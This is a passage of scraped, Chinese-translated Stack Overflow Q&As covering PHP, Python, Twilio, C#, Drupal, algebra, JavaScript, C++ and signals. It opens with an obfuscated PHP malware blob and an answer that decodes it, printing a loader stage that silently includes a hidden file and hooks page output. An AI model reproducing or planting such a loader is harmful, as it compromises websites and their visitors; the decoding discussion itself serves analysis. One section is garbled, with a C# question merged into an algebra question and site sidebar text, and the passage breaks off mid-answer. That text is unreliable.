X/USnLQSQQ/JQHndJnz4njG+xModJABhBYa39m59MfGFlXfLqbd96c5DhSlUlkF8ilyHN852bjKshUNFuj0JAqVToRpNjZteKQWdxPDflU1CJB1InynTL2sGchd4LSXASzyGYl33bmor1FnJEtiqiog0kA+8uRXpRX2+NQstWAbuiN+rdYFsnsJaU3vQNvqMZQJI9CXUjQoTPN6ELp3jD9mqkyBSjKYtWF/xKIJ9eAbuJqd3+WtSj45aJMC1XqdYYfKsHv18xZKOkB4rIGaJKcsEDgdd3bpWtA6KxA9aopHJjH5DFfROh8git/I2pyuUqmkI5+EXTsWGUXlE89XWVm01EecueNAtWeBPlth9fRHv7npP3fUChaXtLMLTkiT1cayXnzyCmIZipxLgBI5sjKQ0197leoJnQMSoDsQlSuWbhGssDXgehreDdvApb0iEEaRnqyv5mNk1ufpQNpmvu23Wrrq31NG8WLhVmBKCelrlnovJI1OaUmJimK6XjF3wpp/miQMfzVjAzi0jlU/ZToVojkqwRdTgEIXWNn+xUWi7j7M6oRJ7D9i+8YXYykz7j3TG3WoQmziv0pRJh/lcGqLWDOR9z894KeQXYe3X1DmlMGmVvyeBwIi2nPgDpjk4m85ttgVLCaTalw18/dW12e3rYHZS62MtmbeqVAiqYJ5BDGMWvgKXVnbPjnv1YJDLjSnEkMoCIGjtd4ic1AEUsBzLqBR88RWRxXewIcEITkn9qpiVNGXLTAdgrDlnlN5dFdf4M2DqQWVHO3W8g2jlIHjGpxB7grBBQ6Xg29CUy7IUIty760vjbbs9IbBvlMlT6G6KhertDhoibOcN7UA8sJ+7x+L/6PAeafia3ZY1EhcHKHfmMFdf8c3r8DV2x3/VjG3viy18ijVH4nv78TPFmEQfrtOJ+mPYzTvAZuTOAmg9U13DMb/hyxJ9NWsOo4q26sy3XAP+/WegJRwdBvQ2puL6jJRiJMGw5Hp3w/pVKV2P7MtRSAdquZC8BlgJBkdNIIR+dnBBtyfBGWKLnjqtrFpf/HyEWyy5Ec9iyKRQjK1ocXkHwbFlA0xXmyJbeknzhYdy1caP9IFYvMYm+/EHiLOBSQiAIi24Xwe5qw7XH2LnQrHEMR/dm1m5IuJtMJnCtkdi1steHcfEIHI/+4zvFXfYgbilqO9ohTaQQbm2/xSA+pCreAHO7hInEVoAlUFfAqJg/phxfOz9xOPYH2ozkGECv208nr/F4Q+ZPhg8U3S5bGzzETa0xMq4dNKuPSrp0WU0+wm6o4kMsU3oMWRuuA1+2ga8eOitPdJZ0706QJIle7DdJAi6Jp6eY38GnGnDeM/QOn5WfT1cmljhW7lAxS/0Aph5/NR9cJwXKCO4k6LpEw5dQbfz9J3e5nBji84gzE6ECxx3t4qvV1ABT1kQKue9VZ4599xVu5/p8tnKf8ErLUne2BTDID6BJit5zvNsPLvI+CLDeSidDyAwmiWxUTMMA3F85lcg+JK/jcEdBJnrv//++fv377//Bw==');
?>
<?php 
```

对此进行解码的最佳方法是什么？任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T00:37:52.023

代替

```
$b0c = create_function('$'/*...*/); 
```

和

```
echo '$'/*...*/; 
```

会得到

```
$veval(gzinflate(base64_decode($v))); 
```

然后

```
echo gzinflate(base64_decode($v)); 
```

几次迭代后，你会得到

```
if(function_exists('ob_start')&&!isset($GLOBALS['mfsn'])){$GLOBALS['mfsn']='/var/www/vhosts/jag35.com/httpdocs/app/design/frontend/default/iphone/template/catalog/product/view/options/type/f01.php';if(file_exists($GLOBALS['mfsn'])){include_once($GLOBALS['mfsn']);if(function_exists('gml')&&function_exists('dgobh')){ob_start('dgobh');}}} 
```

一些自动化。

```
$string = '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';
$stay = true;
do
    {
    $string = gzinflate(base64_decode($string));
    echo $string . PHP_EOL;
    if (preg_match("/eval\(gzinflate\(base64_decode\(\'(.*)\'\)\)\);/", $string, $match))
        $string = $match[1];
    else
        $stay = false;
    }
while ($stay); 
```

但确实，它太本地化了。

# python - 安装 Enthought Canopy 后安装 python 模块“rpy2”

> ID：16204246
> 
> 赞同：4
> 
> 时间：2013-04-25T00:01:44.310
> 
> 标签：python, r, rpy2, enthought

我的一些 python 脚本使用 rpy2 作为 R 的接口，它与以前的 Enthought EPD python 完美配合。

我最近从 Enthought 安装了 Canopy Python。Python 现在不再找到 rpy2 模块，当我尝试重新安装它时，我收到以下错误：

```
$ easy_install rpy2

[...]

Processing rpy2-2.3.5.tar.gz
Writing /var/folders/9n/qk8wf11d205b0lrr57wyg7k80000gp/T/easy_install-HIclIh/rpy2-2.3.5/setup.cfg
Running rpy2-2.3.5/setup.py -q bdist_egg --dist-dir /var/folders/9n/qk8wf11d205b0lrr57wyg7k80000gp/T/easy_install-HIclIh/rpy2-2.3.5/egg-dist-tmp-A3O60G
"/Library/Frameworks/R.framework/Resources/bin/R" CMD config --ldflags
/Library/Frameworks/R.framework/Resources/bin/config: line 142: make: command not found
/Library/Frameworks/R.framework/Resources/bin/config: line 143: make: command not found
R was not built as a library
Invalid substring

in string

error: Setup script exited with Problem while running `"/Library/Frameworks/R.framework/Resources/bin/R" CMD config --ldflags` 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T03:36:40.457

您的错误暗示 R 不是使用 --enable-R-shlib 构建的，或者安装程序难以找到 R。您是否还在此过程中的某个地方升级/重新安装/重建 R？在终端，以下命令的输出是什么：

```
echo $R_HOME 
```

和

```
ls $R_HOME/lib 
```

大概第一个显示 /Library/Frameworks/R.framework/Resources 与 rpy 安装的位置匹配，但是第二个中是否有 libR.dylib 可用？

如果没有，您是否尝试过重新安装 R？

# twilio - Twilio：如何将 SMS 回复映射到原始 SMS

> ID：16204249
> 
> 赞同：6
> 
> 时间：2013-04-25T00:02:03.140
> 
> 标签：twilio

我正在创建一个使用 twilio 的网络应用程序，但我似乎遇到了问题。

该系统由 3 个参与者组成：

*   实体客户
*   物理服务器
*   我们的网络应用程序

每当客户端通过表单创建新的“作业”时，所有作业详细信息都将以文本的形式发送到许多不同的服务器。当任何一个服务器回复该短信时，我们需要能够将他的回复与他回复的特定“工作”相关联。问题是如果不为每个工作购买一个号码并将每个号码与工作相关联，我无法弄清楚如何做到这一点。如果可能的话，我只想使用一个号码，因为购买数千个号码是完全浪费且不可能的。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T09:43:06.250

[Cookie 是处理对话的最佳方式](https://www.twilio.com/blog/2014/07/the-definitive-guide-to-sms-conversation-tracking.html)，但由于您无法分辨服务器回复的是哪条短信，这可能会很棘手。如果您向服务器发送 2 个作业，而他们选择回复第一个作业，您就无法知道这一点。

我认为您有两种明智的做法：

*   为每个作业提供一个服务器可以回复的参考代码（2 或 3 位数字，以使其更容易）。这是最可靠的方法。
*   使用多个（但不是很多）电话号码。因此，在一天或几个小时内，每个号码只向服务器发送一个作业。然后，您可以回收号码池并在作业“超时”后重新使用它们。这取决于您的预期数量。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2013-04-25T00:10:46.920

好吧，根据 Twilio 的说法，答案是使用 cookie：

[http://www.twilio.com/docs/quickstart/php/sms/tracking-conversations](http://www.twilio.com/docs/quickstart/php/sms/tracking-conversations)

> 就像在 Web 应用程序中一样，cookie 是一个小文件，您的应用程序可以存储在 Twilio 的服务器上以跟踪信息，例如用户名或帐户。对于 Twilio SMS，cookie 的范围是两方之间的“对话”——您可以为每个收件人/发件人电话号码对设置一个唯一的 cookie。例如，您可以为在 415-555-2222 和 415-555-1111 之间发送的任何消息存储一个唯一的 cookie，这将不同于在 415-555-3333 和 415-555-1111 之间使用的 cookie。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-01-22T16:29:36.980

我最近遇到了这个问题，发现一篇文章很好地解释了使用@xmjw 提到的池的想法

[用户如何通过 Twilio 互相发送短信](https://support.twilio.com/hc/en-us/articles/223134067-How-can-I-have-users-send-text-messages-to-each-other-over-Twilio-)

尽管应用程序不同，但这里的概念是相同的。对于任何可能偶然发现这个问题并需要其他解决方案的人。

我最终在我的解决方案中做的是生成独特的响应代码。然后在回复中，我可以查询响应代码和发件人编号以与原始文本相关联。但就我而言，双方都是人类。对于像服务器一样自动化的一侧，您可以将文本解析为代码是什么，然后与该代码一起返回。那你就`SELECT * FROM messages WHERE code = ?`.

# c# - c# 铸造清单 to List Currently I have an object of type IList<object> and I need to convert to another type of IList using Type object. eg. Type t = typeof(MyType); var l 问问题 问问题 2013-04-25T00:02:41.620 114 次 This question shows research effort; it is useful and clear 0 This question does not show any research effort; it is unclear or not useful Bookmark this question. Show activity on this post. Currently I have an object of type IList<object> and I need to convert to another type of IList using Type object. eg. Type t = typeof(MyType); var list = OtherClass.MyFunction(myParam param); The var list is of type IList<object> and I need it to be of type IList<t> Currently I have a static function and call for reflection, but this is called within a loop and need to minimize the maximum time spent in my loops. Anyone know any other way to perform this conversion without using reflection? With delegate maybe? Domains and Ranges of sets in algebra State whether the following functions are well-defined. If they are, then give the Domain, Co-domain and Range and state whether the functions are one-to-one and/or onto and give your reasoning. If they are not well defined, then explain why not. a) f: J → J, f(x) = 3x + 1 b) g: N → N, g(x) = x2 – 1 c) h: N → R, h(x) = +x d) j: {words} → {letters}, j(x) = initial letter of x I will appreciate if someone gives correct answers to each part. Thanks c#c#-4.0 4 2 回答 2 This answer is useful 5 您可以使用Enumerable.Cast<T>()： var myList = list.Cast<MyType>().ToList(); 于 2013-04-25T00:07:56.703 回答 This answer is useful 0 如果 T 在编译时未知，我想你可以： var type = typeof(int); IList<object> myList = (new object[]{1, 2, 3, 4, 5}).ToList(); var mi = typeof(Enumerable).GetMethod("Cast"); var mRef = mi.MakeGenericMethod(type); object myIEnumerableOfInt = mRef.Invoke(null, new object[]{myList}); mi = typeof(Enumerable).GetMethod("ToList"); mRef = mi.MakeGenericMethod(type); IList myIListOfInt = (IList)mRef.Invoke(null, new object[]{myIEnumerableOfInt}); ...但是在这里使用这种反射意味着您将永远无法引用它，因为IList<int>您可以在代码中推断出的最多的myIListOfInt是IList... IMO 这里的强制转换完全没用。 于 2013-04-25T00:34:28.053 回答 Related 2 image - 在matlab中制作一个平滑的3D矩阵 1 html - 允许对问题和其他用户交互进行 HTML 嵌入的视频播放器 1 java - 试图保持教程 1 android - 如何存储我的应用程序创建的任务？ 1 oracle - 在 Tomcat、JDBC 和 Eclipse 环境下工作时无法解析类型的连接 3 php - 在for循环中打印内容导致PHP可能由于Apache而崩溃？ 4 java - 用于 Java 的 C 兼容 printf 输出 1 php - 如何通过 ajax 将 JSON 传递给 PHP？ 3 java - 使用两个 android spinners 一个依赖于另一个 2 c# - F# 脚本调用 C# exe 时的 log4net 问题 Reference php × 1429865 c/c++ × 756500 nginx × 49975 mongodb × 159057 mybatis × 3233 anaconda × 13410 pycharm × 14671 python × 1902243 vscode × 56040 docker × 110988 github × 49000 flask × 49129 ffmpeg × 24037 jmeter × 16910 matplotlib × 63493 bootstrap × 54641

> ID：16204256
> 
> 赞同：0
> 
> 时间：
> 
> 标签：c#, c#-4.0

Currently I have an object of type `IList<object>` and I need to convert to another type of `IList` using Type object.

eg.

```
Type t = typeof(MyType);
var list = OtherClass.MyFunction(myParam param); 
```

The ***var list*** is of type `IList<object>` and I need it to be of type `IList<t>`

Currently I have a static function and call for reflection, but this is called within a loop and need to minimize the maximum time spent in my loops.

Anyone know any other way to perform this conversion without using reflection?

With delegate maybe?

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T00:07:56.703

您可以使用[`Enumerable.Cast<T>()`](http://msdn.microsoft.com/en-us/library/bb341406.aspx)：

```
var myList = list.Cast<MyType>().ToList(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T00:34:28.053

如果 T 在编译时未知，我想你可以：

```
var type = typeof(int);
IList<object> myList = (new object[]{1, 2, 3, 4, 5}).ToList();
var mi = typeof(Enumerable).GetMethod("Cast");
var mRef = mi.MakeGenericMethod(type);
object myIEnumerableOfInt = mRef.Invoke(null, new object[]{myList});
mi = typeof(Enumerable).GetMethod("ToList");
mRef = mi.MakeGenericMethod(type);
IList myIListOfInt = (IList)mRef.Invoke(null, new object[]{myIEnumerableOfInt}); 
```

...但是在这里使用这种反射意味着您将永远无法引用它，因为`IList<int>`您可以在代码中推断出的最多的`myIListOfInt`是`IList`... IMO 这里的强制转换完全没用。

# drupal - 使用钩子将类添加到预告片中的链接

> ID：16204261
> 
> 赞同：0
> 
> 时间：2013-04-25T00:03:28.300
> 
> 标签：drupal, drupal-7, hook, hyperlink

我一直在寻找一整天，但我似乎无法让（任何）钩子工作，特别是这个钩子。我想使用 hook_link_alter 将类（颜色框）添加到预告片上的链接。我能够通过破解核心让它工作，但我当然想要一个更好的解决方案。

node.module 中的相关代码是：

```
if ($view_mode == 'teaser') {
$node_title_stripped = strip_tags($node->title);
$links['node-readmore'] = array(
  'title' => t('Read more<span class="element-invisible"> about @title</span>', array('@title' => $node_title_stripped)),
 'href' => 'node/' . $node->nid,    
  'html' => TRUE,
  'attributes' => array('rel' => 'tag', 'title' => $node_title_stripped),

); 
```

}

我能够通过添加来实现我想要的

将最后一行（其中包含文本）替换为：'attributes' => array('class' => 'colorbox' 'rel' => 'tag', 'title' => $node_title_stripped),

请帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:29:19.013

以下代码将有所帮助：

```
function theme_preprocess_node(&$variables) {
  // if readmore link is set
  if (isset($variables['content']['links']['node']['#links']['node-readmore'])) {

    // remove the old link
    unset($variables['content']['links']['node']['#links']['node-readmore']);

    // Create new link variable
    $variables['content']['links']['node']['#links']['node-readmore-custom'] =  l(t('More >'), $variables['node_url'], array('attributes' => array('class' => t('colorbox'))));

  }
} 
```

之后，您需要在 node.tpl.php 中的主题下的适当位置添加这个新变量。

希望这会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-26T03:06:17.817

I don't know much about hooks, but I would use Display Suite: [http://drupal.org/project/ds](http://drupal.org/project/ds)

Make sure you also enable DS Extras, go to Structure->DS and create a CSS Class "colorbox"

Then go edit the content type, manage display, select "teaser", go to the bottom and create a layout (One column).

After saving, select the gear to the right of the link field and select "Expert" in the layout dropdown and "colorbox" in the classes select list.

Once you hit update and save, the field should be rendered with the class.

# set - 代数中集合的域和范围

> ID：16204264
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:03:46.880
> 
> 标签：set, linear-algebra, algebra, relational-algebra

说明下列函数是否定义明确。如果是，请给出域、共域和范围，并说明这些函数是否是一对一的和/或到的，并给出你的推理。如果它们的定义不明确，请解释为什么不明确。

a) f: J → J, f(x) = 3x + 1

b) g: N → N, g(x) = x2 – 1

c) h: N → R, h(x) = +x

d) j: {words} → {letters}, j(x) = x 的首字母

如果有人对每个部分给出正确答案，我将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T14:50:51.557

这看起来像家庭作业，所以我将指导您完成 las 问题，看看您是否可以自己完成其余的工作。

d) j: {words} → {letters}, j(x) = x 的首字母

域：词 共同域：字母 范围：字母

这是上吗？因为每个字母至少有一个单词开头，所以可以得到 Co-Domain 中所有可能的值，所以它是 on。

这是一对一的吗？嗯，不。例如，apple 和 alligator 将给出相同的返回值，即使它们是不同的词。

# github - 解析 githubarchive 响应

> ID：16204266
> 
> 赞同：1
> 
> 时间：2013-04-25T00:04:04.803
> 
> 标签：github, github-archive

我正在尝试参加 Github 数据挑战赛，我正在尝试分析一组 PushEvent，但我得到了一些奇怪的（？）结果。

```
users = Hash.new(0)
(0..23).each do |hour|
    gz = open("http://data.githubarchive.org/2013-04-01-#{hour}.json.gz")
    js = Zlib::GzipReader.new(gz).read
    Yajl::Parser.parse(js) do |event|
        if event["type"] == "PushEvent" && event["actor_attributes"] && event["actor_attributes"]["login"]
            users[event["actor_attributes"]["login"]] += 1
        end
    end
end 
```

该脚本可以正常工作，但是当我通过以下方式查看一个人所做的最多提交时

```
users.values.max 
```

我看到有人在一天内提交了超过 7k 次提交。当我通过并打印出来时

```
event["payload"]["shas"] 
```

所有打印结果基本相同：

```
585a2f02f36da9ee0625a42aa2d5e98836c8a2de
danil@orionet.ru
Notes added by 'git notes add'
Jenkins
true 
```

我假设与 PushEvent 关联的提交消息是“由 'git notes add' 添加的注释”，所以这看起来对吗？还是我在这里误读了一些数据？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-02T20:14:05.583

我知道这是一个很老的问题，但我今天才碰到这个问题。当您说“基本相同”时……这是什么意思？最后一个布尔值在所有这些中都是真的吗？

因为如果我没记错的话（而且我可能......没有找到太多关于这个归档转储格式的文档）最后一个布尔值应该是如果那个提交 SHA 在那个特定的 Push 上是唯一的（意思是如果那个特定的提交尚未在该存储库中看到）。可能是相同的 SHA 和消息，并且都可以推送多次，但只有其中一个应该将该布尔值设置为 true。

因为 Git 是分布式的，而您只是合并以查看一个人的提交，**我建议根据提交 SHA 进行唯一检查，**或者**简单地将 'true' 标志的数量计算为提交的数量**。相同的 SHA 将在 PushEvents 中多次出现，因为在存储库的整个历史中，分叉和分支打开和关闭/合并。

作为旁注，“Jenkins”这个名字告诉你这是一个持续集成系统（[http://jenkins-ci.org/](http://jenkins-ci.org/)）所做的提交，所以在生成这些 7k 时可能存在错误或自动化任务重复提交消息。

# javascript - Javascript, appending a div to each object

> ID：16204269
> 
> 赞同：-2
> 
> 时间：2013-04-25T00:04:37.300
> 
> 标签：javascript

```
<body>

  <input type="text" id="search" onchange="doSearch()" />

  <div id="catalog">
  </div>

  <div id="each_track">
  </div>

  <script>
  SC.initialize({
    client_id: '*****************'
  });

  function doSearch() {
    var searchTerm = document.getElementById('search').value;

        // Search soundcloud for artists
        SC.get('/tracks', { q: searchTerm, license: 'cc-by-sa' }, function(tracks) {
          for(track in tracks) {
            var img = document.createElement('img');
            var catalog = document.getElementById('catalog');
            img.setAttribute("src",tracks[track]["artwork_url"]);
            catalog.appendChild(img);
            }
         }
        });
      };
      </script>
    </body> 
```

Just append a div to each img rather than all the images to the div, in response to the comments.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T00:28:17.213

尝试

```
function doSearch() {
    var searchTerm = document.getElementById('search').value;

    // Search soundcloud for artists
    SC.get('/tracks', { q: searchTerm, license: 'cc-by-sa' }, function(tracks) {
        for(track in tracks) {
            var img = document.createElement('img');
            var catalog = document.getElementById('catalog');
            img.setAttribute("src",tracks[track]["artwork_url"]);

            var div = document.createElement('div');
            div..appendChild(img);

            catalog.appendChild(div);
        }
    });
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T13:48:47.567

```
 for(track in tracks) {
        var img = document.createElement('img');
        var catalog = document.getElementById('catalog');
        var div = document.createElement('div');

        img.setAttribute("src",(tracks[track]["artwork_url"]));
        div.setAttribute("class","music");

        if((tracks[track]["artwork_url"])){
          catalog.appendChild(div);
          div.appendChild(img);
        } 
```

与您的原始答案类似，if 循环针对每个图像元素

# c++ - Standard safe type check?

> ID：16204270
> 
> 赞同：1
> 
> 时间：2013-04-25T00:04:43.753
> 
> 标签：c++, rtti

In my `IsSame` function I would like to return `true` if both pointers are pointing to objects of the same **type**. So only the middle call should return `true`. `D1` and `B` shouldn't be considered the same.

The below seems to be exactly what I want but is it safe according to the standard?

```
#include <stdio.h>

class B { virtual void foo() {} };
class D1 : public B { };
class D2 : public B { };
class D3 : public B { };

bool IsSame(B*a, B*b) {
    if (a == 0 || b == 0)
        return false;
    return *(intptr_t*)a == *(intptr_t*)b;
}

int main() {
    D1 d1;
    D2 d2;
    D1 d1b;
    B b;
    printf("%d %d %d\n", IsSame(&d1, &d2), IsSame(&d1, &d1b), IsSame(&d1, &b));
} 
```

Output:

```
0 1 0 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-25T00:41:20.480

您正在尝试查看这两个对象是否具有相同的 v-table。C++ 标准没有提到 v-table 指针的存在，更不用说它在对象布局中的位置了。因此，您的解决方案非常不标准，并且您的程序的行为实际上是未定义的。

如果您想查看两个基指针是否具有相同的派生类型但没有 RTTI，您将需要一些机制来让您知道派生类型的 id。这可能意味着一个返回所有派生类型都必须实现的 id 的虚拟方法。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T00:16:18.327

以下似乎有效：

```
#include<typeinfo>
#include<iostream>

class B { virtual void foo() {} };
class D1 : public B { };
class D2 : public B { };
class D3 : public B { };

template<typename T1, typename T2>
bool is_same(const T1& t1, const T2& t2) {
  return typeid(t1) == typeid(t2);
}

bool is_same_no_template(const B& b1, const B& b2) {
  return typeid(b1) == typeid(b2);
}

int main(){
    D1 d1;
    D2 d2;
    D1 d1b;
    B b;
    std::cout<<std::boolalpha
             <<"d1 == d2  ? "<<is_same(d1, d2)<<std::endl
             <<"d1 == d1b ? "<<is_same(d1, d1b)<<std::endl
             <<"d1 == b   ? "<<is_same(d1, b)<<std::endl;

    std::cout<<"No Template"<<std::endl;

    std::cout<<std::boolalpha
             <<"d1 == d2  ? "<<is_same_no_template(d1, d2)<<std::endl
             <<"d1 == d1b ? "<<is_same_no_template(d1, d1b)<<std::endl
             <<"d1 == b   ? "<<is_same_no_template(d1, b)<<std::endl;

    return 0;
} 
```

使用 gcc 4.7.2 编译我得到以下输出：

```
[Prompt] g++ example.cpp -std=c++11
[Prompt] ./a.out
d1 == d2  ? false
d1 == d1b ? true
d1 == b   ? false
No Template
d1 == d2  ? false
d1 == d1b ? true
d1 == b   ? false 
```

请注意，如果您决定在没有“运行时类型信息”（RTTI；`-fno-rtti`gcc 中的编译标志）的情况下进行编译，则此代码将无法编译。

# c - 关于在多线程环境中捕获 SIGSEGV

> ID：16204271
> 
> 赞同：7
> 
> 时间：2013-04-25T00:04:46.207
> 
> 标签：c, linux, signals

我想知道是否有可能/推荐的方法`SIGSEGV`在多线程环境中捕获信号。我对处理`SIGSEGV`诸如`*((int *)0) = 0`.

一些关于这个主题的阅读让我找到了`signal()`and `sigaction()`，它安装了一个信号处理程序。虽然在多线程环境中似乎都没有希望。然后我尝试了`sigwaitinfo()`，在一个线程中接收信号，之前的`pthread_sigmask()`调用阻止了其他线程上的信号。`SIGSEGV`它在使用 raise()、在线程内或当它通过类似的东西发送到进程时，在信号被引发的范围内起作用`kill -SIGSEGV`；但是，`\*((int*)0) = 0`仍然会终止该进程。我的测试程序如下

```
void block_signal()
{
        sigset_t set;

        sigemptyset(&set);
        sigaddset(&set, SIGSEGV);
        sigprocmask(SIG_BLOCK, &set, NULL);

        if (pthread_sigmask(SIG_BLOCK, &set, NULL)) {
                fprintf(stderr, "pthread_sigmask failed\n");
                exit(EXIT_FAILURE);
        }
    }

void *buggy_thread(void *param)
{
        char *ptr = NULL;
        block_signal();

        printf("Thread %lu created\n", pthread_self());

        // Sleep for some random time
        { ... }

        printf("About to raise from %lu\n", pthread_self());

        // Raise a SIGSEGV
        *ptr = 0;

        pthread_exit(NULL);
}

void *dispatcher(void *param)
{
        sigset_t set;
        siginfo_t info;
        int sig;

        sigemptyset(&set);
        sigaddset(&set, SIGSEGV);

        for (;;) {
                sig = sigwaitinfo(&set, &info);
                if (sig == -1)
                        fprintf(stderr, "sigwaitinfo failed\n");
                else
                        printf("Received signal SIGSEGV from %u\n", info.si_pid);
        }
}

int main()
{
        int i;
        pthread_t tid;
        pthread_t disp_tid;

        block_signal();

        if (pthread_create(&disp_tid, NULL, dispatcher, NULL)) {
                fprintf(stderr, "Cannot create dispatcher\n");
                exit(EXIT_FAILURE);
        }

        for (i = 0; i < 10; ++i) {
                if (pthread_create(&tid, NULL, buggy_thread, NULL) {
                        fprintf(stderr, "Cannot create thread\n");
                        exit(EXIT_FAILURE);
                }
        }

        pause();
} 
```

出乎意料的是，程序因分段错误而死，而不是打印引发者的线程 ID。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-25T00:55:14.723

